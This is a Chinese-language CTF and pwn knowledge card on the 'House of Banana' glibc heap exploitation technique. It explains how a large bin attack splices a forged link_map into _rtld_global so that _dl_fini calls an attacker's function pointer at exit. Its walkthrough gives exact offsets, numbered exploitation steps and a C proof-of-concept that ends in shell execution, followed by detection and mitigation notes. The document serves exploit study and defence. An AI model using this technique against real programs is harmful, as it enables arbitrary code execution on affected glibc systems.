---
id: binary-pwn-heap-house-of-banana-link-map-dl-fini
title: House of Banana：伪造 _rtld_global._ns_loaded 的 link_map 链，借 _dl_fini 的 DT_FINI_ARRAY 在 exit 时执行 shell
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-banana-link-map-dl-fini
aliases:
- House of Banana
- house_of_banana
- _dl_fini 劫持
- link_map 伪造
- _rtld_global._ns_loaded
- DT_FINI_ARRAY
- l_info[26]
- exit 链劫持
tags:
- pwn
- heap
- glibc
- link-map
- dl-fini
- exit
- large-bin-attack
- rop
- linux
cve: []
severity: high
confidence: high
affected_versions: glibc 2.23 – 2.36（原文标记适用范围）
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V276
  verified_at: '2026-11-08T00:07:50+08:00'
  notes: 已对照原文与 13 张图核对：img02 _rtld_global._dl_ns._ns_loaded=0x7ffff7ffe190、_ns_nloaded=4；img03/04 link_map l_next/l_real；img05 &(_ns_loaded->l_next->l_next->l_next)=0x7ffff7fc7018；img06/07 glibc 2.31 _dl_fini 的 l==l->l_real、l_init_called、l_info[DT_FINI_ARRAY]/[DT_FINI_ARRAYSZ]、((fini_t)array[i])() 检查；img09-11 fake 字段（l_real=fake、+0x31c=0x1c、l_info[26]=0x603d10、l_info[28]=0x603d18）；img12 call qword ptr [r14] <shell>；img13 继续后 whoami 回显 muxuecen，最终代码执行已证明。已把『链上有 3 个真实节点』修正为改写后 3 真实+1 伪造。affected_versions 按原文 2.23–2.36 保留。dedup new，唯一 related 的 exit_hook 卡改 _dl_rtld_lock_recursive，非同一链。
---

## 一句话结论

House of Banana 是在 glibc 2.23–2.36 上利用“任意地址写一个堆地址”（常用 large bin attack）把 `_rtld_global._dl_ns[0]._ns_loaded` 的 link_map 链表接到伪造节点上，再伪造 `l_real`、`l_init_called`、`l_info[DT_FINI_ARRAY]`、`l_info[DT_FINI_ARRAYSZ]` 等字段，使程序 `exit()`/从 `main` 返回进入 `_dl_fini` 时通过 `((fini_t)array[i])()` 调用攻击者写入的函数指针（如 `system`/one_gadget/后门），从而在退出流程中执行任意代码。

## 原理

- **退出链**：`exit()` → `__run_exit_handlers` → `_dl_fini`。`_dl_fini` 遍历动态链接器的 link_map 链表，对每个已初始化对象调用其 `DT_FINI_ARRAY` 中的析构函数。
- **link_map 链表头**：`_rtld_global._dl_ns[0]._ns_loaded` 指向第一个 `link_map`；节点之间用 `l_next`/`l_prev` 双向连接；`_ns_nloaded` 记录节点数。`_ns_loaded`、`_ns_nloaded` 布局在 `struct rtld_global` 中（first element 必须保持）。
- **_dl_fini 第一段（收集 maps）**（glibc 2.31 源码）：
  ```c
  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next) {
      if (l == l->l_real) {          // check 1
          assert(i < nloaded);
          maps[i] = l;
          l->l_idx = i;
          ++i;
      }
      ++l->l_direct_opencount;
  }
  ...
  unsigned int nmaps = i;
  ```
  - `l == l->l_real`：真实节点的 `l_real` 指向自身；伪造节点也必须把 `l_real` 写成自己的地址，否则不会被收进 `maps`。
  - `assert(i < nloaded)`：`_ns_nloaded` 必须足够大。原文示例 `_ns_nloaded=4`，把第 3 个节点（下标 2）的 `l_next` 改成伪造节点后，链上变为 3 个真实节点 + 1 个伪造节点（共 4 个），伪造节点是 `maps[3]`；`nloaded` 小于实际节点数会触发断言。
  - `l_idx` 会被写回节点（`l->l_idx = i`），伪造节点需可写。
- **_dl_fini 第二段（调用析构）**：
  ```c
  for (i = 0; i < nmaps; ++i) {
      struct link_map *l = maps[i];
      if (!l->l_init_called) continue;      // check 2
      l->l_init_called = 0;
      if (l->l_info[DT_FINI_ARRAY] != NULL || l->l_info[DT_FINI] != NULL) {  // check 3
          if (l->l_info[DT_FINI_ARRAY] != NULL) {
              ElfW(Addr) *array =
                  (ElfW(Addr) *)(l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
              unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                                / sizeof(ElfW(Addr)));
              while (i-- > 0)
                  ((fini_t) array[i])();     // 劫持点
          }
          ...
      }
  }
  ```
  - `l_init_called` 必须为非零，否则 `continue`；伪造节点要把它置为真（demo 中在 `fake+0x31c` 写 `0x1c`，具体偏移随 glibc 版本/编译选项变化）。
  - `l_info[DT_FINI_ARRAY]`（`DT_FINI_ARRAY` 宏值为 26）必须非空；`l_info[DT_FINI_ARRAYSZ]`（宏值 28）用于取数组长度，也必须可解引用。
  - `l_info` 是 `ElfW(Dyn) *` 数组，`l_info[26]`/`l_info[28]` 在 x86-64 `link_map` 中分别位于 `fake+0x110`/`fake+0x120`（`l_info` 从 `+0x40` 开始，每项 8 字节）。
- **伪造技巧**：让 `l_info[26]` 指向 fake 内部的一个假 `Elf64_Dyn`，其 `d_un.d_ptr`（`Dyn+8`）指向 `fake+0x58`，于是 `array = l_addr + fake+0x58`；再让 `l_info[28]` 指向另一个假 `Dyn`，其 `d_un.d_val` = 8，于是 `i = 8/8 = 1`，`while (i-- > 0)` 调用 `array[0]`，即 `*(fake+0x58)` 处的函数指针（shell/one_gadget）。
- 原文 demo 的伪造代码（`fake = p2 - 0x10`，x86-64）：
  ```c
  *(uint64_t*)(fake+0x28)  = fake;        // l_real = fake，过 check 1
  *(uint64_t*)(fake+0x31c) = 0x1c;        // l_init_called 非零，过 check 2
  *(uint64_t*)(fake+0x110) = fake+0x40;   // l_info[26] -> 假 Dyn
  *(uint64_t*)(fake+0x48)  = fake+0x58;   // 假 Dyn.d_un.d_ptr = fake+0x58 -> array
  *(uint64_t*)(fake+0x58)  = (uint64_t)shell; // array[0] = shell
  *(uint64_t*)(fake+0x120) = fake+0x48;   // l_info[28] -> 另一个假 Dyn
  *(uint64_t*)(fake+0x50)  = 0x8;         // 假 Dyn.d_un.d_val = 8 -> i = 1
  ```
  注意：`l_info[26]` 是指针，`l->l_info[26]->d_un.d_ptr` 先解引用假 Dyn 再取 `+8` 的值；`l_addr` 在 demo 中为 0，所以 `array = fake+0x58`。
- **写入原语**：通常用 large bin attack 把链表头/某个 `l_next` 覆盖为伪造堆地址。原文 demo 用 `p1`（0x428）与 `p2`（0x418）制造 size 不同的 largebin chunk，`free(p1)` 后 `malloc(0x438)` 把 p1 插入 largebin；`free(p2)` 后用 `p1[3] = next_node - 0x20` 做 large bin attack，再 `malloc(0x438)` 把 p2 插入 largebin 完成写入，把第三个 link_map 的 `l_next` 改成 `fake`。目标表达式为 `&(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)`，即第 3 个节点的 `l_next` 字段。
- 最终 `return 0`（或 `exit`）触发 `_dl_fini`，第二次循环到 `maps[3]`（伪造节点）时调用 `array[0] = shell`。原文 gdb 在 `_dl_fini+520` 断到 `call qword ptr [r14] <shell>`，执行 `whoami` 得到当前用户，证明代码执行。

## 触发条件

- glibc 2.23–2.36（原文标记）；不同版本 `link_map` 字段偏移、`l_init_called` 位置/位域、`_dl_fini` 检查可能变化，需按目标 libc 重新确认。
- 存在“任意地址写一个堆地址”的原语（常用 large bin attack，也可用其他写原语），且能写到 `_rtld_global._dl_ns[0]._ns_loaded` 链上的某个 `l_next`。
- 能泄露 libc 基址（定位 `_rtld_global`/`_dl_fini`）与堆地址（构造 fake link_map）。
- 程序会从 `main` 返回或调用 `exit()`（不能是 `_exit`/`sys_exit`，否则不经过 `__run_exit_handlers`）。
- `_ns_nloaded` 足够大（示例为 4），保证 `assert(i < nloaded)` 通过；伪造节点可写（`l_idx` 回写）且 `l_init_called` 可置非零。
- 有可控的函数指针目标（后门、`system("/bin/sh")`、one_gadget 等）。

## 利用步骤

1. 泄露 libc 与堆地址，计算 `_rtld_global` 地址；用 gdb 确认 `_rtld_global._dl_ns[0]._ns_loaded` 的链表与 `_ns_nloaded`（示例为 4），找到第 3 个节点的 `l_next` 地址（`p &(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)`）。
2. 准备两个大小不同的 largebin chunk（如 0x428 与 0x418，附 0x18 guard 防合并），在 `p2 - 0x10` 处按上面的偏移布置 fake link_map。
3. 按目标 glibc 版本确认 `l_real`（`+0x28`）、`l_init_called`、`l_info` 起始（`+0x40`）、`l_info[26]`（`+0x110`）、`l_info[28]`（`+0x120`）偏移；不同版本用 gdb `p &((struct link_map*)0)->l_info[26]` 等验证。
4. 触发 large bin attack：`free(p1)` → `malloc(大块)` 让 p1 进 largebin → `free(p2)` → 覆盖 `p1[3]`（bk_nextsize）为目标 `l_next - 0x20` → `malloc(大块)` 让 p2 进 largebin，完成对目标 `l_next` 的写入（写入 fake 地址）。
5. 让程序 `return`/`exit`，`_dl_fini` 遍历到伪造节点，调用 `array[0]`，执行 shell/one_gadget。
6. 调试：在 `_dl_fini` 的 `l == l->l_real` 检查、`l_init_called` 检查、`l_info[DT_FINI_ARRAY]` 检查与 `call qword ptr [r14]` 处下断，确认 fake 字段与偏移；若断言失败，检查 `_ns_nloaded` 与 `l_real`。

## PoC

以下为原文 demo 的关键结构（地址/偏移为示例，需按目标 libc 与堆布局重算；未在本机复跑）：

```c
uint64_t libcBase = getLibcBase();
uint64_t rtld_global = libcBase + 0x23d060;          // 目标 libc 偏移
uint64_t *next_node = (uint64_t *)(rtld_global - 0x4b048);
uint64_t *p1 = malloc(0x428);                         // largebin chunk
uint64_t *g1 = malloc(0x18);
uint64_t *p2 = malloc(0x418);                         // size 与 p1 不同
uint64_t *g2 = malloc(0x18);
uint64_t fake = (uint64_t)p2 - 0x10;

*(uint64_t *)(fake + 0x28)  = fake;                   // l_real = fake
*(uint64_t *)(fake + 0x31c) = 0x1c;                   // l_init_called != 0
*(uint64_t *)(fake + 0x110) = fake + 0x40;            // l_info[26] -> 假 Dyn
*(uint64_t *)(fake + 0x48)  = fake + 0x58;            // 假 Dyn.d_un.d_ptr = fake+0x58
*(uint64_t *)(fake + 0x58)  = (uint64_t)shell;        // array[0] = shell
*(uint64_t *)(fake + 0x120) = fake + 0x48;            // l_info[28] -> 假 Dyn
*(uint64_t *)(fake + 0x50)  = 0x8;                    // d_un.d_val = 8 -> i = 1

free(p1);                                             // p1 进 unsorted
uint64_t *g3 = malloc(0x438);                         // p1 进入 largebin
free(p2);                                             // p2 进 unsorted
p1[3] = ((uint64_t)next_node - 0x20);                 // large bin attack 目标
uint64_t *g4 = malloc(0x438);                         // p2 进入 largebin，完成写入
p2[1] = 0;                                            // 清 l_next（视布局）
p2[3] = fake;                                         // 第 3 个 link_map 的 l_next = fake
return 0;                                             // exit -> _dl_fini -> shell
```

## 变体与关联

- 与 exit_hook 变体的区别：[[binary-pwn-format-string-exit-hook-rtld-global]] 同样是 `exit→_dl_fini`，但它改的是 `_rtld_global._dl_rtld_lock_recursive`/`_dl_rtld_unlock_recursive` 两个锁函数指针（glibc < 2.34），不需要伪造 link_map；本草稿伪造 link_map + `DT_FINI_ARRAY`，适用 2.23–2.36，触发条件与伪造字段完全不同。
- large bin attack 本身见 [[binary-pwn-heap-house-of-storm-unsorted-largebin-fake-chunk]] 等卡；House of Banana 是 large bin attack 的一个典型“写堆地址到 link_map 链”的用法。
- 其他 House of 系列：[[binary-pwn-heap-house-of-apple2-source-analysis-largebin-system]]、[[binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system]]、[[binary-pwn-heap-house-of-peach-top-chunk-sysmalloc-largebin]]。
- 变体要点：目标节点不一定是第 3 个，按 `_ns_nloaded` 与链表长度选择；`l_init_called` 偏移/位域随 glibc 版本变化；`array` 可由 `l_addr`（可设为非零）与假 Dyn 的 `d_ptr` 组合指向任意可读地址，`i` 由 `DT_FINI_ARRAYSZ` 控制；也可让 `array[0]` 指向 one_gadget 或 `system("/bin/sh")`。

## 检测与防御

- 利用条件检测（CTF/防御）：监控 `exit` 前的 `_rtld_global`/link_map 链表完整性；在 `_dl_fini` 中校验 `l_real == l`、`_ns_nloaded` 与实际链表长度一致、`l_info[DT_FINI_ARRAY]`/`DT_FINI_ARRAYSZ` 指向合法 `.dynamic` 区域；对 `DT_FINI_ARRAY` 的数组地址做范围校验（必须落在对应对象的只读段内）。
- 缓解：glibc 升级到已修复/加固版本（原文只声明到 2.36，后续版本请核对 `_dl_fini` 行为）；启用 CET/CFI 提高间接调用门槛；减少可被 large bin attack 利用的堆写原语；退出前对关键指针做完整性检查。
- 程序侧：避免使用 `exit` 处理敏感清理（但这不是可靠防御）；对 link_map 结构只读映射（需要 loader 支持）；CTF 中则重点检查 largebin 写入目标是否落在 `_rtld_global` 附近。
